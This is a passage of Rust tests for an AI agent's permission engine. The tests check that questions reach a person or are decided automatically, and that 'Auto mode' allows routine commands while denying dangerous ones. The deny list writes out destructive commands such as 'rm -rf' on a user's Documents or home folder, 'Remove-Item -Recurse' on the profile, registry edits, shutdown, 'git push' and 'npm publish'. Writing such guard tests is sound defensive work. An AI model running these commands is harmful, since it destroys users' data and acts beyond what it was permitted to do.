            e.call("core_action_approve", json!({"tool_name": "Bash", "input": {"command": "git push"}}), crate::CallOptions::new(crate::Caller::Mcp)).unwrap();
        answerer.join().unwrap();
        let v = out.to_json();
        assert_eq!(v["result"]["behavior"], "allow");
        assert_eq!(v["result"]["updatedInput"]["command"], "git push");
        let reopened = Workspace::open(&w.root).unwrap();
        assert!(reopened.manifest.allowed_actions.contains(&"bash:git".to_string()), "always-allow is remembered");
        // Without an inbox, a question is a clear, actionable error.
        let e2 = crate::Engine::new(crate::testing::session());
        e2.session().settings.auto_mode = false;
        let err = e2.call("core_person_ask", json!({"question": "Blue or red?"}), crate::CallOptions::new(crate::Caller::Mcp)).err().unwrap();
        assert!(err.remediation.unwrap_or_default().contains("sensible choice"));
    }

    #[test]
    fn a_projects_choice_decides_whether_questions_reach_the_person() {
        let (_d, w) = ws();
        let e = crate::Engine::new(crate::testing::session());
        e.session().ext.insert(std::sync::Arc::new(InboxDir(w.inbox_dir())));
        let call = |id: &str, p: Value| e.call(id, p, crate::CallOptions::new(crate::Caller::Mcp)).unwrap().to_json()["result"].clone();
        let ask = || call("core_person_ask", json!({"question": "Blue or red?", "choices": ["Blue", "Red"]}));
        // Auto mode is on and nothing is chosen: the builder decides, and says so.
        let read = call("project_questions_set", json!({"project": w.root}));
        assert_eq!((read["questions"].as_str(), read["chosen"].is_null()), (Some("decide"), true));
        let decided = ask();
        assert_eq!(decided["answered"], false);
        assert!(decided["note"].as_str().unwrap().contains("I decided:"));
        assert!(Inbox::new(w.inbox_dir()).pending().is_empty(), "nobody was asked");

        // "Ask me" for this project: the question waits for the person, even with Auto mode on.
        assert_eq!(call("project_questions_set", json!({"project": w.root, "mode": "ask"}))["questions"], "ask");
        assert_eq!(Workspace::open(&w.root).unwrap().manifest.questions, Some(Questions::Ask), "kept in craft.json");
        let inbox = Inbox::new(w.inbox_dir());
        let answerer = std::thread::spawn(move || {
            for _ in 0..100 {
                if let Some(r) = inbox.pending().first() {
                    inbox.answer(&r.id, &crate::inbox::Answer { choice: Some("Red".into()), ..Default::default() }).unwrap();
                    return;
                }
                std::thread::sleep(Duration::from_millis(50));
            }
            panic!("the question never reached the person");
        });
        let answered = ask();
        answerer.join().unwrap();
        assert_eq!((answered["answered"].as_bool(), answered["choice"].as_str()), (Some(true), Some("Red")));

        // "Decide" for this project wins over an app that asks; "default" goes back to the app's.
        e.session().settings.auto_mode = false;
        call("project_questions_set", json!({"project": w.root, "mode": "decide"}));
        assert_eq!(ask()["answered"], false);
        let back = call("project_questions_set", json!({"project": w.root, "mode": "default"}));
        assert_eq!((back["questions"].as_str(), back["chosen"].is_null(), back["app_default"].as_str()), (Some("ask"), true, Some("ask")));
    }

    #[test]
    fn auto_mode_keeps_going_but_never_does_the_dangerous_things() {
        let (_d, w) = ws();
        let e = crate::Engine::new(crate::testing::session());
        assert!(e.session().settings.auto_mode, "on by default");
        e.session().ext.insert(std::sync::Arc::new(InboxDir(w.inbox_dir())));
        let call = |tool: &str, input: Value| {
            e.call("core_action_approve", json!({"tool_name": tool, "input": input}), crate::CallOptions::new(crate::Caller::Mcp)).unwrap().to_json()
        };
        let root = w.root.display().to_string().replace('\\', "/");
        // Anything that used to ask now goes ahead, with nobody asked.
        for cmd in ["python -I c:/tmp/dz5/props.py", "git clone https://example.com/x", &format!("rm -rf \"{root}/app/Build\""), "rm -rf ./Intermediate"] {
            assert_eq!(call("Bash", json!({"command": cmd}))["result"]["behavior"], "allow", "{cmd}");
        }
        assert_eq!(call("PowerShell", json!({"command": "Get-ChildItem D:/SteamLibrary"}))["result"]["behavior"], "allow");
        assert_eq!(call("Write", json!({"file_path": "C:/Users/me/Documents/Unreal Projects/Game/x.ini", "content": ""}))["result"]["behavior"], "allow");
        // These are refused, again without asking: the builder finds another way.
        for cmd in [
            "git push origin main",
            "rm -rf C:/Users/me/Documents",
            "rm -rf ~/stuff",
            "Remove-Item -Recurse $env:USERPROFILE\\x",
            "reg add HKCU\\x",
            "shutdown /s",
            "npm publish",
        ] {
            let v = call("Bash", json!({"command": cmd}));
            assert_eq!(v["result"]["behavior"], "deny", "{cmd}");
            assert!(v["result"]["message"].as_str().unwrap().contains("Auto mode never"), "{cmd}");
        }
        let system_file = if cfg!(windows) { "C:/Windows/System32/x.dll" } else { "/etc/x.conf" };
        assert_eq!(call("Write", json!({"file_path": system_file, "content": ""}))["result"]["behavior"], "deny");
        assert_eq!(call("Edit", json!({"file_path": w.root.join("craft.json").display().to_string()}))["result"]["behavior"], "deny");
        assert!(Inbox::new(w.inbox_dir()).pending().is_empty(), "nothing waited for the person");
        // A question gets "decide yourself" at once.
        let v = e.call("core_person_ask", json!({"question": "Blue or red?"}), crate::CallOptions::new(crate::Caller::Mcp)).unwrap().to_json();
        assert_eq!(v["result"]["answered"], false);
        assert!(v["result"]["note"].as_str().unwrap().contains("decide questions yourself"));
    }

    #[test]
    fn a_project_edited_in_place_can_change_its_files_but_not_craft_anythings_records() {
        let d = tempfile::tempdir().unwrap();
        std::fs::write(d.path().join("index.html"), "<p>hi</p>").unwrap();
        let w = Workspace::create_at(d.path(), "Site", "x", TargetRef::None, Some(crate::workspace::ExistingFiles::Edit)).unwrap();
        let file = |rel: &str| json!({"file_path": w.root.join(rel).display().to_string()});
        assert_eq!(decide(Some(&w), "Edit", &file("index.html")), Decision::Allow);
        assert_eq!(decide(Some(&w), "Write", &file("src/app.js")), Decision::Allow);
        assert_eq!(decide(Some(&w), "Write", &file("checks/round-1/notes.md")), Decision::Allow);
        for own in ["craft.json", "inbox/a.json", "feed.json"] {
            assert!(matches!(decide(Some(&w), "Write", &file(own)), Decision::Ask { .. }), "{own}");
        }
    }
}
